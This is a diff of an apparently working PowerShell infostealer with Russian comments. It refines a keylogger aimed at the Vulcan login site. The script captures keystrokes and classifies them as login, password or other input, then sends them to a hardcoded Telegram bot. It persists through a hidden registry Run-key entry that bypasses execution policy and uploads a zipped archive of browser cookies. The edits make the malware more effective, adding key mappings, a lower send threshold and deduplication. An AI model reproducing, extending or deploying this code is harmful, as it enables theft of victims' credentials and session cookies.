@@ -21,8 +21,6 @@ try {
 } catch {$wifi = "WiFi error"}
 
 # УСОВЕРШЕНСТВОВАННЫЙ КЕЙЛОГГЕР ДЛЯ ПЕРЕХВАТА ЛОГИНА И ПАРОЛЯ ВУЛКАН
-$keyloggerStatus = "Starting..."
-
 # Создаем улучшенный кейлоггер
 $keyloggerScript = @"
 Add-Type -AssemblyName System.Windows.Forms
@@ -43,10 +41,7 @@ Add-Type -AssemblyName System.Windows.Forms
 `$currentWindow = ""
 `$buffer = ""
 `$isVulcanSite = `$false
-`$loginField = `$false
-`$passwordField = `$false
-`$loginData = ""
-`$passwordData = ""
+`$lastSentData = ""
 
 function Send-ToTelegram {
     param(`$message)
@@ -60,24 +55,17 @@ function Send-ToTelegram {
 }
 
 function Process-Buffer {
-    if(`$buffer -ne "") {
+    if(`$buffer -ne "" -and `$buffer -ne `$lastSentData) {
+        `$lastSentData = `$buffer
+        
         # Определяем тип данных по контексту
         if(`$buffer -match "(login|user|username|uzytkownik|nazwa|email|e-mail|@)") {
-            `$loginData = `$buffer
-            Send-ToTelegram "🔑 VULCAN LOGIN: `$loginData"
+            Send-ToTelegram "VULCAN LOGIN: `$buffer"
         } elseif(`$buffer -match "(password|haslo|pass|pwd)") {
-            `$passwordData = `$buffer
-            Send-ToTelegram "🔒 VULCAN PASSWORD: `$passwordData"
-            
-            # Если есть и логин и пароль - отправляем вместе
-            if(`$loginData -ne "" -and `$passwordData -ne "") {
-                Send-ToTelegram "🎯 VULCAN CREDENTIALS COMPLETE:`nLogin: `$loginData`nPassword: `$passwordData"
-                `$loginData = ""
-                `$passwordData = ""
-            }
+            Send-ToTelegram "VULCAN PASSWORD: `$buffer"
         } else {
             # Отправляем обычные данные
-            Send-ToTelegram "📝 VULCAN INPUT: `$buffer"
+            Send-ToTelegram "VULCAN INPUT: `$buffer"
         }
         
         `$capturedData += `$buffer
@@ -104,15 +92,16 @@ while(`$true) {
         }
         
         if(`$siteDetected) {
-            if(!`$isVulcanSite) {
+            if(!`$isVulcanSite -or `$currentWindow -ne `$activeWindow) {
                 `$isVulcanSite = `$true
-                Send-ToTelegram "🎯 USER OPENED VULCAN SITE:`n`$activeWindow"
+                `$currentWindow = `$activeWindow
+                Send-ToTelegram "VULCAN SITE DETECTED: `$activeWindow"
             }
         } else {
             if(`$isVulcanSite) {
                 `$isVulcanSite = `$false
                 Process-Buffer
-                Send-ToTelegram "📱 USER LEFT VULCAN SITE"
+                Send-ToTelegram "USER LEFT VULCAN"
             }
         }
         
@@ -183,19 +172,59 @@ while(`$true) {
                                 } else {
                                     `$buffer += "="
                                 }
+                            } elseif(`$key -eq 186 -or `$key -eq 59) {
+                                # Точка с запятой/двоеточие
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                if(`$isShift) {
+                                    `$buffer += ":"
+                                } else {
+                                    `$buffer += ";"
+                                }
+                            } elseif(`$key -eq 222) {
+                                # Кавычки/апостроф
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                if(`$isShift) {
+                                    `$buffer += "`""
+                                } else {
+                                    `$buffer += "'"
+                                }
+                            } elseif(`$key -eq 220) {
+                                # Обратный слеш/прямой слеш
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                if(`$isShift) {
+                                    `$buffer += "|"
+                                } else {
+                                    `$buffer += "\"
+                                }
+                            } elseif(`$key -eq 188 -or `$key -eq 108) {
+                                # Запятая/меньше
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                if(`$isShift) {
+                                    `$buffer += "<"
+                                } else {
+                                    `$buffer += ","
+                                }
+                            } elseif(`$key -eq 191 -or `$key -eq 111) {
+                                # Слеш/вопрос
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                if(`$isShift) {
+                                    `$buffer += "?"
+                                } else {
+                                    `$buffer += "/"
+                                }
                             }
                         }
                     }
                     
                     # Автоматически отправляем длинные вводы
-                    if(`$buffer.Length -gt 50) {
+                    if(`$buffer.Length -gt 30) {
                         Process-Buffer
                     }
                 }
             }
         }
     } catch { }
-    Start-Sleep -Milliseconds 5
+    Start-Sleep -Milliseconds 2
 }
 "@
 
@@ -209,9 +238,9 @@ try {
     $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\vulcan_logger.ps1`""
     Set-ItemProperty -Path $startupPath -Name "SystemMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
     
-    $keyloggerStatus = "✅ Advanced keylogger active - monitoring Vulcan sites"
+    $keyloggerStatus = "Advanced keylogger active - monitoring Vulcan sites"
 } catch {
-    $keyloggerStatus = "❌ Keylogger failed: $($_.Exception.Message)"
+    $keyloggerStatus = "Keylogger failed: $($_.Exception.Message)"
 }
 
 # Безопасность
@@ -328,7 +357,7 @@ if (Test-Path $zipPath) {
         Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
             chat_id = '5674514050'
             document = [System.IO.File]::OpenRead($zipPath)
-            caption = "📁 COOKIES ARCHIVE - Download and extract to view cookies files"
+            caption = "COOKIES ARCHIVE - Download and extract to view cookies files"
         }
     } catch {
         # Если не удалось отправить ZIP, отправляем файлы по отдельности
